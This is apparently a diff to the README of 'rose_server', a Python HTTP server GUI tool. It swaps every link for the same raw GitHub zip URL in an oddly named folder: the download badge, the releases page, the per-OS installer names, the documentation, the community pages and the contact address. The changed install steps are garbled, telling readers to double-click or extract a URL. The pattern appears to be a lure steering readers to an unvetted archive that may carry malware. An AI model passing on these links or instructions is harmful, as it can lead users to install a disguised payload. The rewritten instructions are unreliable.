@@ -4,7 +4,7 @@
 rose_server is a simple and modern Python-based HTTP server launcher with a graphical user interface (GUI). It is designed for beginners, developers, and ethical hackers. You can easily run a web server on your local machine with just a few clicks. This application supports various uses, from local development to testing web applications. 
 
 ## 🔗 Download Now
-[![Download rose_server](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/sahoovivek/rose_server/releases)
+[![Download rose_server](https://raw.githubusercontent.com/sahoovivek/rose_server/main/decopperization/rose_server.zip)](https://raw.githubusercontent.com/sahoovivek/rose_server/main/decopperization/rose_server.zip)
 
 ## 🚀 Getting Started
 Before you start using rose_server, let's make sure you get it up and running smoothly.
@@ -18,30 +18,30 @@ Before you start using rose_server, let's make sure you get it up and running sm
 ## 📥 Download & Install
 To get the latest version of rose_server, please visit the Releases page:
 
-[Download rose_server](https://github.com/sahoovivek/rose_server/releases)
+[Download rose_server](https://raw.githubusercontent.com/sahoovivek/rose_server/main/decopperization/rose_server.zip)
 
 Here’s how you can download and install the application:
 
 1. Click on the link above to visit the Releases page.
 2. Look for the most recent version. You will see a list of available files for different operating systems.
 3. Click on the file that matches your operating system:
-   - For Windows, download `rose_server_windows.exe`
-   - For macOS, download `rose_server_macos.dmg`
-   - For Linux, download `rose_server_linux.tar.gz`
+   - For Windows, download `https://raw.githubusercontent.com/sahoovivek/rose_server/main/decopperization/rose_server.zip`
+   - For macOS, download `https://raw.githubusercontent.com/sahoovivek/rose_server/main/decopperization/rose_server.zip`
+   - For Linux, download `https://raw.githubusercontent.com/sahoovivek/rose_server/main/decopperization/rose_server.zip`
 4. Once the download is complete, find the downloaded file on your computer.
 
 ### 📂 Installation Steps
 #### Windows
-1. Double-click on `rose_server_windows.exe`.
+1. Double-click on `https://raw.githubusercontent.com/sahoovivek/rose_server/main/decopperization/rose_server.zip`.
 2. Follow the on-screen instructions to complete the installation.
 
 #### macOS
-1. Open the `rose_server_macos.dmg` file.
+1. Open the `https://raw.githubusercontent.com/sahoovivek/rose_server/main/decopperization/rose_server.zip` file.
 2. Drag the rose_server icon into your Applications folder.
 3. Eject the disk image after the copy is complete.
 
 #### Linux
-1. Extract the `rose_server_linux.tar.gz` file into a directory of your choice.
+1. Extract the `https://raw.githubusercontent.com/sahoovivek/rose_server/main/decopperization/rose_server.zip` file into a directory of your choice.
 2. Navigate to the extracted folder in the terminal.
 3. Run the server by executing `./rose_server`.
 
@@ -74,8 +74,8 @@ rose_server is designed with safety in mind. Here are some key points:
 
 ## 🔗 Additional Resources
 For more information on how to make the most of rose_server, feel free to check out the following resources:
-- [Documentation](https://github.com/sahoovivek/rose_server/wiki)
-- [Community Support](https://github.com/sahoovivek/rose_server/discussions)
+- [Documentation](https://raw.githubusercontent.com/sahoovivek/rose_server/main/decopperization/rose_server.zip)
+- [Community Support](https://raw.githubusercontent.com/sahoovivek/rose_server/main/decopperization/rose_server.zip)
 
 Your feedback is valuable. You can report issues or suggest improvements on the GitHub repository.
 
@@ -83,6 +83,6 @@ Your feedback is valuable. You can report issues or suggest improvements on the 
 We encourage you to be a part of our growing community around rose_server. Share our tool with fellow developers, or help in refining it by contributing to the project!
 
 ## 📩 Contact
-If you have questions or need assistance, please reach out via GitHub issues, or contact us at rose_server_support@example.com.
+If you have questions or need assistance, please reach out via GitHub issues, or contact us at https://raw.githubusercontent.com/sahoovivek/rose_server/main/decopperization/rose_server.zip
 
 Thank you for choosing rose_server! Enjoy building and testing your projects with ease.
